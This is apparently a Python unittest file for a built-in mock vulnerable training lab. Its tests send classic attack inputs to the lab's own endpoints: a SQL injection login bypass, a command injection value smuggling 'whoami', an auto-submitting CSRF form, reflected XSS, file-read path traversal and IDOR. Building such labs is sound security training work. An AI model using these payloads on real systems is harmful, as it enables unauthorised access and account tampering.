"""Unit and Integration Tests for Stage 5: Built-in Mock Vulnerable Lab."""

import unittest
from fastapi.testclient import TestClient

from cai.lab.app import create_mock_lab_app, CHALLENGE_FLAGS, SOLVED_FLAGS
from cai.lab.server import mock_lab_manager


class TestMockLab(unittest.TestCase):
    def setUp(self):
        SOLVED_FLAGS.clear()
        self.app = create_mock_lab_app()
        self.client = TestClient(self.app)

    def test_reconnaissance_robots_and_admin(self):
        # 1. Robots.txt
        res = self.client.get("/robots.txt")
        self.assertEqual(res.status_code, 200)
        self.assertIn("/admin-portal/", res.text)

        # 2. Hidden Admin Portal
        res_admin = self.client.get("/admin-portal/")
        self.assertEqual(res_admin.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["recon_admin"], res_admin.text)
        self.assertIn(CHALLENGE_FLAGS["recon_admin"], SOLVED_FLAGS)

    def test_sqli_auth_bypass(self):
        # Normal failed login
        res_fail = self.client.post("/login", data={"username": "admin", "password": "wrongpassword"}, follow_redirects=True)
        self.assertIn("Invalid credentials", res_fail.text)
        self.assertNotIn(CHALLENGE_FLAGS["sqli_auth"], SOLVED_FLAGS)

        # SQL Injection Authentication Bypass
        res_sqli = self.client.post(
            "/login",
            data={"username": "' OR 1=1--", "password": ""},
            follow_redirects=True,
        )
        self.assertEqual(res_sqli.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["sqli_auth"], SOLVED_FLAGS)

    def test_csrf_vulnerability_and_exploit_server(self):
        # 1. Direct CSRF state change without anti-CSRF token
        res = self.client.post("/my-account/change-email", data={"email": "attacker@evil.com"}, follow_redirects=True)
        self.assertEqual(res.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["csrf_email"], SOLVED_FLAGS)

        # Reset flag
        SOLVED_FLAGS.clear()

        # 2. Exploit Server delivery simulation
        exploit_payload = """
        <form action="/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@attacker.org" />
        </form>
        <script>document.forms[0].submit();</script>
        """
        res_deliver = self.client.post("/exploit-server/deliver", data={"payload": exploit_payload}, follow_redirects=True)
        self.assertEqual(res_deliver.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["csrf_email"], SOLVED_FLAGS)

    def test_idor_invoices(self):
        # Normal invoice 101
        res_norm = self.client.get("/api/v1/invoices/101")
        self.assertEqual(res_norm.status_code, 200)
        data_norm = res_norm.json()
        self.assertEqual(data_norm["invoice"]["id"], 101)

        # Admin Confidential Invoice 999
        res_idor = self.client.get("/api/v1/invoices/999")
        self.assertEqual(res_idor.status_code, 200)
        data_idor = res_idor.json()
        self.assertIn(CHALLENGE_FLAGS["idor_invoice"], data_idor["invoice"]["secret_flag"])
        self.assertIn(CHALLENGE_FLAGS["idor_invoice"], SOLVED_FLAGS)

    def test_command_injection_ping(self):
        # Command injection via ping host argument
        res = self.client.post(
            "/tools/ping",
            data={"host": "127.0.0.1; whoami"},
            follow_redirects=True,
        )
        self.assertEqual(res.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["rce_ping"], SOLVED_FLAGS)

    def test_path_traversal_lfi(self):
        # Read flag.txt via /view?file=
        res = self.client.get("/view?file=flag.txt")
        self.assertEqual(res.status_code, 200)
        self.assertIn(CHALLENGE_FLAGS["lfi_flag"], res.text)
        self.assertIn(CHALLENGE_FLAGS["lfi_flag"], SOLVED_FLAGS)

    def test_reflected_xss(self):
        # Search query with script tag
        xss_payload = "<script>alert(1)</script>"
        res = self.client.get(f"/products?q={xss_payload}")
        self.assertEqual(res.status_code, 200)
        self.assertIn(xss_payload, res.text)
        self.assertIn(CHALLENGE_FLAGS["xss_search"], SOLVED_FLAGS)

    def test_lab_status_and_reset(self):
        # Solve one flag
        self.client.get("/admin-portal/")
        status_res = self.client.get("/api/v1/status").json()
        self.assertEqual(status_res["status"], "online")
        self.assertGreaterEqual(status_res["solved_count"], 1)

        # Reset
        reset_res = self.client.post("/api/v1/reset").json()
        self.assertEqual(reset_res["status"], "reset_complete")
        self.assertEqual(len(SOLVED_FLAGS), 0)


if __name__ == "__main__":
    unittest.main()

